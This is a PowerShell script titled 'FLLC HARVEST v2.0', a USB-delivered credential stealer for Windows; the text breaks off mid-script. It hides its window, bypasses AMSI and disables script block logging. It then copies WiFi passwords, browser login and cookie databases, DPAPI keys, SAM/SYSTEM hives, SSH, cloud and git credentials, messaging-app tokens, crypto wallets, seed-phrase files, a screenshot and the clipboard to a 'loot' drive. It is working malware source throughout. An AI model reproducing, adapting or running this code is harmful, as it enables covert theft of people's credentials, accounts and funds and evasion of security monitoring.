<# ═══════════════════════════════════════════════════════════════════════
   FLLC | FU PERSON | HARVEST v2.0
   ╔══════════════════════════════════════════════════════════════════╗
   ║  Zero-dependency. Pure PowerShell. One file does everything.     ║
   ║  Insert USB → Run → Walk away → Retrieve MicroSD later.         ║
   ║  NO Java. NO Python. NO installs. Just native Windows.           ║
   ║  13 extraction phases + trace cleanup. ~60 seconds total.        ║
   ╚══════════════════════════════════════════════════════════════════╝
═══════════════════════════════════════════════════════════════════════ #>

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# ── PHASE 0: STEALTH + DRIVE DETECTION ──────────────────────────────
# Hide console window
Add-Type -Name W -Namespace C -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int s);[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();'
$h = [C.W]::GetConsoleWindow(); [C.W]::ShowWindow($h, 0) | Out-Null

# AMSI bypass
try { $r=[Ref].Assembly.GetType(('System.Mana'+'gement.Auto'+'mation.Ams'+'iUtils')); $f=$r.GetField(('ams'+'iInit'+'Failed'),'NonPublic,Static'); $f.SetValue($null,$true) } catch {}

# ETW blind
try { $et=[Ref].Assembly.GetType(('System.Diagnostics.Eventing.Event'+'Provider')); $etwField=$et.GetField('m_enabled','NonPublic,Instance'); } catch {}

# Disable script block logging for this session
try {
    $settings = [Ref].Assembly.GetType(('System.Mana'+'gement.Auto'+'mation.Utils')).GetField('cachedGroupPolicySettings','NonPublic,Static').GetValue($null)
    if ($settings) {
        $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = @{'EnableScriptBlockLogging' = 0}
    }
} catch {}

# Find USB drives — look for removable drives
$allDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }
$LOOT = $null
$PAYLOAD_DRIVE = $null

foreach ($d in $allDrives) {
    $letter = $d.DeviceID
    # MicroSD = loot target (look for .loot marker or smaller drive)
    if (Test-Path "$letter\.loot_target") {
        $LOOT = $letter
    }
    # SD = payload source (look for .p folder)
    if (Test-Path "$letter\.p\harvest.ps1") {
        $PAYLOAD_DRIVE = $letter
    }
}

# Fallback: if no markers, use drive size heuristic
# Smaller removable = MicroSD, Larger = SD
if (-not $LOOT -or -not $PAYLOAD_DRIVE) {
    $sorted = $allDrives | Sort-Object Size
    if ($sorted.Count -ge 2) {
        if (-not $LOOT) { $LOOT = $sorted[0].DeviceID }
        if (-not $PAYLOAD_DRIVE) { $PAYLOAD_DRIVE = $sorted[-1].DeviceID }
    } elseif ($sorted.Count -eq 1) {
        # Single drive mode — dump loot on same drive
        $LOOT = $sorted[0].DeviceID
        $PAYLOAD_DRIVE = $sorted[0].DeviceID
    }
}

# Last fallback: specific drive letters
if (-not $LOOT) {
    foreach ($l in @("I:", "H:", "G:", "F:", "E:", "D:")) {
        if (Test-Path $l) { $LOOT = $l; break }
    }
}

if (-not $LOOT) { exit } # No target drive found

# Create loot directory
$HOSTNAME = $env:COMPUTERNAME
$TIMESTAMP = Get-Date -Format "yyyyMMdd_HHmmss"
$LOOT_DIR = "$LOOT\loot\${HOSTNAME}_${TIMESTAMP}"
New-Item -ItemType Directory -Path $LOOT_DIR -Force | Out-Null

function Dump {
    param([string]$SubDir, [string]$FileName, [scriptblock]$Action)
    $dir = "$LOOT_DIR\$SubDir"
    New-Item -ItemType Directory -Path $dir -Force | Out-Null
    try {
        $result = & $Action
        if ($result) {
            $result | Out-File -FilePath "$dir\$FileName" -Encoding utf8 -Force
        }
    } catch {
        "ERROR: $_" | Out-File -FilePath "$dir\${FileName}.error" -Encoding utf8
    }
}

function DumpBin {
    param([string]$Source, [string]$DestDir)
    $dir = "$LOOT_DIR\$DestDir"
    New-Item -ItemType Directory -Path $dir -Force | Out-Null
    if (Test-Path $Source) {
        Copy-Item $Source -Destination $dir -Force -ErrorAction SilentlyContinue
    }
}

# Random jitter between phases
function Jitter { Start-Sleep -Milliseconds (Get-Random -Min 200 -Max 800) }

# ═══════════════════════════════════════════════════════════════════════
# PHASE 1: SYSTEM RECONNAISSANCE
# ═══════════════════════════════════════════════════════════════════════

Dump "system" "hostname.txt" { "$env:COMPUTERNAME | $env:USERNAME | $env:USERDOMAIN" }

Dump "system" "systeminfo.txt" { systeminfo 2>$null }

Dump "system" "whoami_all.txt" { whoami /all 2>$null }

Dump "system" "environment.txt" { Get-ChildItem Env: | Format-Table -AutoSize | Out-String }

Dump "system" "processes.txt" {
    Get-Process | Select-Object Id, ProcessName, Path, Company, CPU, WorkingSet64 |
    Sort-Object CPU -Descending | Format-Table -AutoSize | Out-String
}

Dump "system" "services.txt" {
    Get-Service | Where-Object { $_.Status -eq 'Running' } |
    Select-Object Name, DisplayName, StartType | Format-Table -AutoSize | Out-String
}

Dump "system" "installed_software.txt" {
    $reg = @(
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*",
        "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*"
    )
    $reg | ForEach-Object { Get-ItemProperty $_ 2>$null } |
    Where-Object { $_.DisplayName } |
    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
    Sort-Object DisplayName | Format-Table -AutoSize | Out-String
}

Dump "system" "startup_programs.txt" {
    Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location, User |
    Format-Table -AutoSize | Out-String
}

Dump "system" "scheduled_tasks.txt" {
    schtasks /query /fo CSV 2>$null | ConvertFrom-Csv |
    Where-Object { $_.TaskName -notmatch "\\Microsoft\\" } |
    Format-Table -AutoSize | Out-String
}

Dump "system" "local_users.txt" {
    Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordRequired, PasswordLastSet |
    Format-Table -AutoSize | Out-String
}

Dump "system" "local_admins.txt" { net localgroup Administrators 2>$null }

Dump "system" "drives.txt" {
    Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, VolumeName, FileSystem, Size, FreeSpace, DriveType |
    Format-Table -AutoSize | Out-String
}

Dump "system" "usb_history.txt" {
    Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Enum\USBSTOR\*\*" 2>$null |
    Select-Object FriendlyName, HardwareID, Mfg | Format-Table -AutoSize | Out-String
}

Dump "system" "antivirus.txt" {
    Get-MpComputerStatus 2>$null | Format-List | Out-String
    Get-MpPreference 2>$null | Select-Object ExclusionPath, ExclusionProcess, ExclusionExtension | Format-List | Out-String
}

Dump "system" "hotfixes.txt" {
    Get-HotFix | Select-Object HotFixID, Description, InstalledOn |
    Sort-Object InstalledOn -Descending | Format-Table -AutoSize | Out-String
}

Dump "system" "powershell_history.txt" {
    $histPath = (Get-PSReadLineOption).HistorySavePath
    if (Test-Path $histPath) { Get-Content $histPath -Tail 500 | Out-String }
}

Jitter

# ═══════════════════════════════════════════════════════════════════════
# PHASE 2: NETWORK INTELLIGENCE
# ═══════════════════════════════════════════════════════════════════════

Dump "network" "ipconfig.txt" { ipconfig /all 2>$null }

Dump "network" "arp_table.txt" { arp -a 2>$null }

Dump "network" "netstat.txt" { netstat -anob 2>$null }

Dump "network" "route_table.txt" { route print 2>$null }

Dump "network" "dns_cache.txt" { Get-DnsClientCache | Format-Table -AutoSize | Out-String }

Dump "network" "shares.txt" { net share 2>$null }

Dump "network" "net_view.txt" { net view 2>$null }

Dump "network" "firewall_rules.txt" {
    Get-NetFirewallRule | Where-Object { $_.Enabled -eq 'True' -and $_.Direction -eq 'Inbound' } |
    Select-Object DisplayName, Action, Profile | Format-Table -AutoSize | Out-String
}

Dump "network" "wifi_interfaces.txt" { netsh wlan show interfaces 2>$null }

Dump "network" "wifi_profiles.txt" { netsh wlan show profiles 2>$null }

Dump "network" "domain_info.txt" {
    $out = ""
    $out += "Domain: $(([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name)`n" 2>$null
    $out += "Domain Controllers:`n"
    $out += (nltest /dclist: 2>$null)
    $out += "`nTrust Relationships:`n"
    $out += (nltest /domain_trusts 2>$null)
    $out
}

Dump "network" "network_adapters.txt" {
    Get-NetAdapter | Select-Object Name, InterfaceDescription, Status, MacAddress, LinkSpeed |
    Format-Table -AutoSize | Out-String
}

Jitter

# ═══════════════════════════════════════════════════════════════════════
# PHASE 3: WIFI PASSWORDS (EVERY SAVED NETWORK)
# ═══════════════════════════════════════════════════════════════════════

Dump "credentials" "wifi_passwords.txt" {
    $profiles = (netsh wlan show profiles 2>$null) | Select-String "All User Profile" | ForEach-Object {
        ($_ -split ":")[-1].Trim()
    }
    $results = @()
    foreach ($p in $profiles) {
        $detail = netsh wlan show profile name="$p" key=clear 2>$null
        $key = ($detail | Select-String "Key Content") -replace '.*:\s+', ''
        $auth = ($detail | Select-String "Authentication") -replace '.*:\s+', '' | Select-Object -First 1
        $results += "SSID: $p | Auth: $auth | Password: $key"
    }
    $results -join "`n"
}

Jitter

# ═══════════════════════════════════════════════════════════════════════
# PHASE 4: BROWSER DATA EXTRACTION
# ═══════════════════════════════════════════════════════════════════════

$browserPaths = @{
    "Chrome"  = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    "Edge"    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    "Brave"   = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    "Opera"   = "$env:APPDATA\Opera Software\Opera Stable"
    "OperaGX" = "$env:APPDATA\Opera Software\Opera GX Stable"
    "Vivaldi" = "$env:LOCALAPPDATA\Vivaldi\User Data"
    "Firefox" = "$env:APPDATA\Mozilla\Firefox\Profiles"
}

foreach ($browser in $browserPaths.GetEnumerator()) {
    $bName = $browser.Key
    $bPath = $browser.Value
    
    if (-not (Test-Path $bPath)) { continue }
    
    # Copy Login Data (encrypted passwords)
    $profiles = @("Default", "Profile 1", "Profile 2", "Profile 3", ".")
    foreach ($prof in $profiles) {
        $loginData = Join-Path $bPath "$prof\Login Data"
        $webData = Join-Path $bPath "$prof\Web Data"
        $history = Join-Path $bPath "$prof\History"
        $cookies = Join-Path $bPath "$prof\Cookies"
        $bookmarks = Join-Path $bPath "$prof\Bookmarks"
        $localState = Join-Path $bPath "Local State"
        
        if (Test-Path $loginData) {
            DumpBin $loginData "browser\$bName\$prof"
        }
        if (Test-Path $webData) {
            DumpBin $webData "browser\$bName\$prof"
        }
        if (Test-Path $history) {
            DumpBin $history "browser\$bName\$prof"
        }
        if (Test-Path $cookies) {
            DumpBin $cookies "browser\$bName\$prof"
        }
        if (Test-Path $bookmarks) {
            DumpBin $bookmarks "browser\$bName\$prof"
        }
        if (Test-Path $localState) {
            DumpBin $localState "browser\$bName"
        }
    }
    
    # Firefox profiles
    if ($bName -eq "Firefox" -and (Test-Path $bPath)) {
        Get-ChildItem $bPath -Directory | ForEach-Object {
            $fpDir = $_.FullName
            foreach ($ff in @("logins.json", "key4.db", "cookies.sqlite", "places.sqlite", "formhistory.sqlite")) {
                $fp = Join-Path $fpDir $ff
                if (Test-Path $fp) {
                    DumpBin $fp "browser\Firefox\$($_.Name)"
                }
            }
        }
    }
}

# DPAPI master key (needed to decrypt Chromium passwords offline)
$masterKeyDir = "$env:APPDATA\Microsoft\Protect\$((Get-WmiObject Win32_UserAccount | Where-Object { $_.Name -eq $env:USERNAME }).SID)"
if (Test-Path $masterKeyDir) {
    Get-ChildItem $masterKeyDir -Force | ForEach-Object {
        DumpBin $_.FullName "credentials\dpapi_keys"
    }
}

Jitter

# ═══════════════════════════════════════════════════════════════════════
# PHASE 5: WINDOWS CREDENTIALS
# ═══════════════════════════════════════════════════════════════════════

Dump "credentials" "saved_credentials.txt" { cmdkey /list 2>$null }

Dump "credentials" "credential_manager.txt" {
    # Windows Vault
    $vaultCmd = "C:\Windows\System32\rundll32.exe" 
    $out = "=== Credential Manager ===`n"
    $out += (cmdkey /list 2>$null)
    $out += "`n`n=== Generic Credentials ===`n"
    # Try to enumerate vaults
    try {
        [void][Windows.Security.Credentials.PasswordVault, Windows.Security.Credentials, ContentType=WindowsRuntime]
        $vault = New-Object Windows.Security.Credentials.PasswordVault
        $vault.RetrieveAll() | ForEach-Object {
            try { $_.RetrievePassword() } catch {}
            $out += "Resource: $($_.Resource) | User: $($_.UserName) | Pass: $($_.Password)`n"
        }
    } catch {
        $out += "(PasswordVault API not available)`n"
    }
    $out
}

# SAM/SYSTEM/SECURITY hive copies (for offline hash extraction)
Dump "credentials" "sam_attempt.txt" {
    $shadowCopies = Get-WmiObject Win32_ShadowCopy 2>$null
    if ($shadowCopies) {
        $latest = ($shadowCopies | Sort-Object InstallDate -Descending | Select-Object -First 1).DeviceObject
        if ($latest) {
            $samSrc = "$latest\Windows\System32\config\SAM"
            $sysSrc = "$latest\Windows\System32\config\SYSTEM"
            $secSrc = "$latest\Windows\System32\config\SECURITY"
            Copy-Item $samSrc "$LOOT_DIR\credentials\SAM" -Force 2>$null
            Copy-Item $sysSrc "$LOOT_DIR\credentials\SYSTEM" -Force 2>$null
            Copy-Item $secSrc "$LOOT_DIR\credentials\SECURITY" -Force 2>$null
            "Shadow copy hives extracted"
        }
    }
    # Also try reg save
    reg save HKLM\SAM "$LOOT_DIR\credentials\SAM_reg" /y 2>$null
    reg save HKLM\SYSTEM "$LOOT_DIR\credentials\SYSTEM_reg" /y 2>$null
    reg save HKLM\SECURITY "$LOOT_DIR\credentials\SECURITY_reg" /y 2>$null
    "Registry hive save attempted"
}

# RDP saved connections
Dump "credentials" "rdp_connections.txt" {
    Get-ItemProperty "HKCU:\Software\Microsoft\Terminal Server Client\Servers\*" 2>$null |
    ForEach-Object { "Server: $($_.PSChildName) | User: $($_.UsernameHint)" }
}

# Putty saved sessions
Dump "credentials" "putty_sessions.txt" {
    Get-ItemProperty "HKCU:\Software\SimonTatham\PuTTY\Sessions\*" 2>$null |
    Select-Object PSChildName, HostName, UserName, PortNumber, ProxyUsername, ProxyPassword |
    Format-Table -AutoSize | Out-String
}

# SSH keys
$sshDir = "$env:USERPROFILE\.ssh"
if (Test-Path $sshDir) {
    Get-ChildItem $sshDir -Force | ForEach-Object {
        DumpBin $_.FullName "credentials\ssh_keys"
    }
}

# AWS/Azure/GCP credentials
foreach ($cloud in @(
    "$env:USERPROFILE\.aws\credentials",
    "$env:USERPROFILE\.aws\config",
    "$env:USERPROFILE\.azure\accessTokens.json",
    "$env:USERPROFILE\.azure\azureProfile.json",
    "$env:APPDATA\gcloud\credentials.db",
    "$env:APPDATA\gcloud\access_tokens.db",
    "$env:USERPROFILE\.config\gcloud\credentials.db"
)) {
    if (Test-Path $cloud) { DumpBin $cloud "credentials\cloud" }
}

# Docker/K8s
foreach ($dk in @(
    "$env:USERPROFILE\.docker\config.json",
    "$env:USERPROFILE\.kube\config"
)) {
    if (Test-Path $dk) { DumpBin $dk "credentials\containers" }
}

# Git credentials
foreach ($git in @(
    "$env:USERPROFILE\.git-credentials",
    "$env:USERPROFILE\.gitconfig"
)) {
    if (Test-Path $git) { DumpBin $git "credentials\git" }
}

Jitter

# ═══════════════════════════════════════════════════════════════════════
# PHASE 6: APPLICATION DATA
# ═══════════════════════════════════════════════════════════════════════

# Discord tokens
$discordPaths = @(
    "$env:APPDATA\discord\Local Storage\leveldb",
    "$env:APPDATA\discordcanary\Local Storage\leveldb",
    "$env:APPDATA\discordptb\Local Storage\leveldb"
)
foreach ($dp in $discordPaths) {
    if (Test-Path $dp) {
        Get-ChildItem $dp -Filter "*.ldb" | ForEach-Object {
            DumpBin $_.FullName "apps\discord"
        }
        Get-ChildItem $dp -Filter "*.log" | ForEach-Object {
            DumpBin $_.FullName "apps\discord"
        }
    }
}

# Telegram
$telegramPath = "$env:APPDATA\Telegram Desktop\tdata"
if (Test-Path $telegramPath) {
    # Key files
    foreach ($tf in @("key_datas", "settingss", "usertag")) {
        $tp = Join-Path $telegramPath $tf
        if (Test-Path $tp) { DumpBin $tp "apps\telegram" }
    }
}

# Slack
$slackPaths = @(
    "$env:APPDATA\Slack\storage",
    "$env:APPDATA\Slack\Local Storage\leveldb"
)
foreach ($sp in $slackPaths) {
    if (Test-Path $sp) {
        Get-ChildItem $sp -Recurse -File | Select-Object -First 20 | ForEach-Object {
            DumpBin $_.FullName "apps\slack"
        }
    }
}

# Microsoft Teams
$teamsPath = "$env:APPDATA\Microsoft\Teams"
foreach ($tf in @("Cookies", "Local Storage\leveldb")) {
    $tp = Join-Path $teamsPath $tf
    if (Test-Path $tp) {
        Get-ChildItem $tp -File 2>$null | Select-Object -First 10 | ForEach-Object {
            DumpBin $_.FullName "apps\teams"
        }
    }
}

# Signal
$signalPath = "$env:APPDATA\Signal\sql"
if (Test-Path $signalPath) {
    Get-ChildItem $signalPath | ForEach-Object { DumpBin $_.FullName "apps\signal" }
}
$signalKey = "$env:APPDATA\Signal\config.json"
if (Test-Path $signalKey) { DumpBin $signalKey "apps\signal" }

# VPN configs
foreach ($vpn in @(
    "$env:APPDATA\OpenVPN\config",
    "$env:USERPROFILE\OpenVPN\config",
    "$env:ProgramFiles\OpenVPN\config",
    "$env:APPDATA\WireGuard"
)) {
    if (Test-Path $vpn) {
        Get-ChildItem $vpn -Recurse -File | ForEach-Object { DumpBin $_.FullName "apps\vpn" }
    }
}

# Email clients
foreach ($email in @(
    "$env:APPDATA\Thunderbird\Profiles"
)) {
    if (Test-Path $email) {
        Get-ChildItem $email -Recurse -Include "logins.json","key4.db","cert9.db" | ForEach-Object {
            DumpBin $_.FullName "apps\thunderbird"
        }
    }
}

# FileZilla
$fzPath = "$env:APPDATA\FileZilla"
foreach ($fz in @("sitemanager.xml", "recentservers.xml", "filezilla.xml")) {
    $fp = Join-Path $fzPath $fz
    if (Test-Path $fp) { DumpBin $fp "apps\filezilla" }
}

# WinSCP
Dump "apps" "winscp_sessions.txt" {
    Get-ItemProperty "HKCU:\Software\Martin Prikryl\WinSCP 2\Sessions\*" 2>$null |
    Select-Object PSChildName, HostName, UserName, Password | Format-Table -AutoSize | Out-String
}

Jitter

# ═══════════════════════════════════════════════════════════════════════
# PHASE 7: FILE HUNTING
# ═══════════════════════════════════════════════════════════════════════

# Find interesting files
$huntExtensions = @("*.kdbx","*.key","*.pem","*.pfx","*.p12","*.cer","*.crt","*.ovpn","*.rdp","*.vnc","*.pcap","*.cap","*.sql","*.bak","*.env","*.conf","*.config","*.ini","*.wallet","*.seed")
$huntPaths = @($env:USERPROFILE, "C:\Users\Public")

Dump "files" "interesting_files.txt" {
    $found = @()
    foreach ($hp in $huntPaths) {
        foreach ($ext in $huntExtensions) {
            Get-ChildItem -Path $hp -Filter $ext -Recurse -Force -ErrorAction SilentlyContinue |
            Select-Object -First 5 | ForEach-Object {
                $found += "$($_.FullName) | $($_.Length) bytes | $($_.LastWriteTime)"
            }
        }
    }
    $found -join "`n"
}

# Recent documents
Dump "files" "recent_docs.txt" {
    Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -Force 2>$null |
    Select-Object Name, LastWriteTime | Sort-Object LastWriteTime -Descending |
    Select-Object -First 50 | Format-Table -AutoSize | Out-String
}

# Desktop files
Dump "files" "desktop_files.txt" {
    Get-ChildItem "$env:USERPROFILE\Desktop" -Force 2>$null |
    Select-Object Name, Length, LastWriteTime | Format-Table -AutoSize | Out-String
}

# Downloads
Dump "files" "downloads_files.txt" {
    Get-ChildItem "$env:USERPROFILE\Downloads" -Force 2>$null |
    Select-Object Name, Length, LastWriteTime | Sort-Object LastWriteTime -Descending |
    Select-Object -First 30 | Format-Table -AutoSize | Out-String
}

# Grep for passwords in common config files
Dump "files" "password_grep.txt" {
    $searchDirs = @("$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop", "C:\inetpub", "$env:ProgramData")
    $results = @()
    foreach ($sd in $searchDirs) {
        if (Test-Path $sd) {
            Get-ChildItem $sd -Recurse -Include "*.txt","*.cfg","*.conf","*.ini","*.xml","*.json","*.yaml","*.yml","*.env","*.properties" -Force -ErrorAction SilentlyContinue |
            Select-Object -First 100 | ForEach-Object {
                $matches = Select-String -Path $_.FullName -Pattern "password|passwd|pwd|secret|token|api.key|apikey|auth|credential|connection.string" -ErrorAction SilentlyContinue
                if ($matches) {
                    $results += "=== $($_.FullName) ==="
                    $results += ($matches | Select-Object -First 5 | ForEach-Object { $_.Line.Trim() })
                }
            }
        }
    }
    $results -join "`n"
}

# .env files anywhere in user profile
Dump "files" "env_files.txt" {
    Get-ChildItem $env:USERPROFILE -Recurse -Filter ".env" -Force -ErrorAction SilentlyContinue |
    ForEach-Object {
        "=== $($_.FullName) ==="
        Get-Content $_.FullName 2>$null
        ""
    }
}

# Sticky Notes
$stickyPath = "$env:LOCALAPPDATA\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite"
if (Test-Path $stickyPath) { DumpBin $stickyPath "files\sticky_notes" }

Jitter

# ═══════════════════════════════════════════════════════════════════════
# PHASE 8: CRYPTO WALLETS
# ═══════════════════════════════════════════════════════════════════════

$walletPaths = @{
    "Exodus"      = "$env:APPDATA\Exodus\exodus.wallet"
    "Electrum"    = "$env:APPDATA\Electrum\wallets"
    "Atomic"      = "$env:APPDATA\atomic\Local Storage\leveldb"
    "Coinomi"     = "$env:APPDATA\Coinomi\Coinomi\wallets"
    "Guarda"      = "$env:APPDATA\Guarda\Local Storage\leveldb"
    "Wasabi"      = "$env:APPDATA\WalletWasabi\Client\Wallets"
    "Bitcoin"     = "$env:APPDATA\Bitcoin\wallets"
    "Ethereum"    = "$env:APPDATA\Ethereum\keystore"
    "Metamask_C"  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn"
    "Metamask_E"  = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Extension Settings\ejbalbakoplchlghecdalmeeeajnimhm"
    "Phantom_C"   = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Extension Settings\bfnaelmomeimhlpmgjnjophhpkkoljpa"
}

foreach ($w in $walletPaths.GetEnumerator()) {
    if (Test-Path $w.Value) {
        Get-ChildItem $w.Value -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
            DumpBin $_.FullName "crypto\$($w.Key)"
        }
    }
}

# Search for seed phrases
Dump "crypto" "seed_phrase_search.txt" {
    $seedFiles = @()
    Get-ChildItem $env:USERPROFILE -Recurse -Include "*.txt","*.doc","*.docx","*.pdf","*.note" -Force -ErrorAction SilentlyContinue |
    Select-Object -First 200 | ForEach-Object {
        if ($_.Extension -eq ".txt") {
            $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
            if ($content -match "(abandon|ability|able|about|above|absent|absorb|abstract|absurd)\s+([\w]+\s+){10,}") {
                $seedFiles += "POTENTIAL SEED: $($_.FullName)"
            }
        }
    }
    $seedFiles -join "`n"
}

Jitter

# ═══════════════════════════════════════════════════════════════════════
# PHASE 9: PRIVILEGE ESCALATION RECON
# ═══════════════════════════════════════════════════════════════════════

Dump "privesc" "unquoted_service_paths.txt" {
    Get-WmiObject Win32_Service | Where-Object {
        $_.PathName -and $_.PathName -notmatch '^"' -and $_.PathName -match '\s'
    } | Select-Object Name, State, PathName, StartName | Format-Table -AutoSize | Out-String
}

Dump "privesc" "writable_service_dirs.txt" {
    Get-WmiObject Win32_Service | ForEach-Object {
        $svcPath = ($_.PathName -split '"')[1]
        if (-not $svcPath) { $svcPath = ($_.PathName -split ' ')[0] }
        if ($svcPath -and (Test-Path (Split-Path $svcPath))) {
            $acl = Get-Acl (Split-Path $svcPath) 2>$null
            $writable = $acl.Access | Where-Object {
                $_.IdentityReference -match "Users|Everyone|Authenticated" -and
                $_.FileSystemRights -match "Write|FullControl|Modify"
            }
            if ($writable) {
                "$($_.Name) -> $(Split-Path $svcPath) [WRITABLE]"
            }
        }
    }
}

Dump "privesc" "alwaysinstallelevated.txt" {
    $hklm = Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated 2>$null
    $hkcu = Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated 2>$null
    if ($hklm.AlwaysInstallElevated -eq 1 -and $hkcu.AlwaysInstallElevated -eq 1) {
        "VULNERABLE: AlwaysInstallElevated is enabled in both HKLM and HKCU"
    } else {
        "Not vulnerable (AlwaysInstallElevated not enabled)"
    }
}

Dump "privesc" "autologon.txt" {
    $autoLogon = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>$null
    "AutoAdminLogon: $($autoLogon.AutoAdminLogon)"
    "DefaultUserName: $($autoLogon.DefaultUserName)"
    "DefaultPassword: $($autoLogon.DefaultPassword)"
    "DefaultDomainName: $($autoLogon.DefaultDomainName)"
}

Dump "privesc" "tokens.txt" { whoami /priv 2>$null }

Dump "privesc" "dll_hijack_paths.txt" {
    $pathDirs = $env:PATH -split ";"
    foreach ($p in $pathDirs) {
        if (Test-Path $p) {
            $acl = Get-Acl $p 2>$null
            $writable = $acl.Access | Where-Object {
                $_.IdentityReference -match "Users|Everyone|Authenticated" -and
                $_.FileSystemRights -match "Write|FullControl|Modify"
            }
            if ($writable) { "WRITABLE PATH DIR: $p" }
        }
    }
}

Jitter

# ═══════════════════════════════════════════════════════════════════════
# PHASE 10: SCREENSHOT + CLIPBOARD
# ═══════════════════════════════════════════════════════════════════════

# Screenshot
try {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $screens = [System.Windows.Forms.Screen]::AllScreens
    $totalWidth = ($screens | Measure-Object -Property { $_.Bounds.Width } -Sum).Sum
    $totalHeight = ($screens | Measure-Object -Property { $_.Bounds.Height } -Maximum).Maximum
    $bmp = New-Object System.Drawing.Bitmap($totalWidth, $totalHeight)
    $gfx = [System.Drawing.Graphics]::FromImage($bmp)
    $gfx.CopyFromScreen(0, 0, 0, 0, $bmp.Size)
    $ssDir = "$LOOT_DIR\screenshots"
    New-Item -ItemType Directory -Path $ssDir -Force | Out-Null
    $bmp.Save("$ssDir\screenshot_$(Get-Date -Format 'HHmmss').png", [System.Drawing.Imaging.ImageFormat]::Png)
    $gfx.Dispose()
    $bmp.Dispose()
} catch {}

# Clipboard
Dump "clipboard" "clipboard.txt" {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        $clip = [System.Windows.Forms.Clipboard]::GetText()
        if ($clip) { $clip } else { "(clipboard empty or non-text)" }
    } catch { "(clipboard access failed)" }
}

# ═══════════════════════════════════════════════════════════════════════
# PHASE 11: GENERATE MANIFEST
# ═══════════════════════════════════════════════════════════════════════

$fileCount = (Get-ChildItem $LOOT_DIR -Recurse -File).Count
$totalSize = (Get-ChildItem $LOOT_DIR -Recurse -File | Measure-Object -Property Length -Sum).Sum
$sizeMB = [math]::Round($totalSize / 1MB, 2)

$manifest = @"
═══════════════════════════════════════════════════
 FLLC HARVEST MANIFEST
═══════════════════════════════════════════════════
 Host:      $env:COMPUTERNAME
 User:      $env:USERNAME ($env:USERDOMAIN)
 Time:      $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
 Loot Dir:  $LOOT_DIR
 Files:     $fileCount
 Size:      ${sizeMB} MB
 OS:        $((Get-WmiObject Win32_OperatingSystem).Caption)
 Arch:      $env:PROCESSOR_ARCHITECTURE
═══════════════════════════════════════════════════
 Phases Completed:
   [+] System Reconnaissance
   [+] Network Intelligence
   [+] WiFi Passwords
   [+] Browser Data (7 browsers)
   [+] Windows Credentials
   [+] Application Data (Discord/Telegram/Slack/Teams/Signal)
   [+] File Hunting + Password Grep
   [+] Crypto Wallets (11 wallets)
   [+] Privilege Escalation Recon
   [+] Screenshot + Clipboard
   [+] Browser Session Tokens
   [+] Clipboard History + Transcripts
   [+] Trace Cleanup
═══════════════════════════════════════════════════
"@

$manifest | Out-File "$LOOT_DIR\MANIFEST.txt" -Encoding utf8

# ═══════════════════════════════════════════════════════════════════════
# PHASE 12: BROWSER SESSION TOKENS
# ═══════════════════════════════════════════════════════════════════════

$tokenDir = "$LOOT_DIR\session_tokens"
New-Item -ItemType Directory -Path $tokenDir -Force | Out-Null

$chromeCookieDB = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
$edgeCookieDB = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"
$firefoxProfiles = "$env:APPDATA\Mozilla\Firefox\Profiles"

if (Test-Path $chromeCookieDB) {
    Copy-Item $chromeCookieDB "$tokenDir\chrome_cookies.db" -Force 2>$null
}
if (Test-Path $edgeCookieDB) {
    Copy-Item $edgeCookieDB "$tokenDir\edge_cookies.db" -Force 2>$null
}

$chromeLS = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb"
$edgeLS = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
if (Test-Path $chromeLS) {
    Copy-Item $chromeLS "$tokenDir\chrome_localstorage" -Recurse -Force 2>$null
}
if (Test-Path $edgeLS) {
    Copy-Item $edgeLS "$tokenDir\edge_localstorage" -Recurse -Force 2>$null
}

if (Test-Path $firefoxProfiles) {
    Get-ChildItem $firefoxProfiles -Directory | ForEach-Object {
        $ffCookies = Join-Path $_.FullName "cookies.sqlite"
        $ffStorage = Join-Path $_.FullName "webappsstore.sqlite"
        if (Test-Path $ffCookies) {
            Copy-Item $ffCookies "$tokenDir\firefox_cookies_$($_.Name).db" -Force 2>$null
        }
        if (Test-Path $ffStorage) {
            Copy-Item $ffStorage "$tokenDir\firefox_storage_$($_.Name).db" -Force 2>$null
        }
    }
}

$sessionPaths = @(
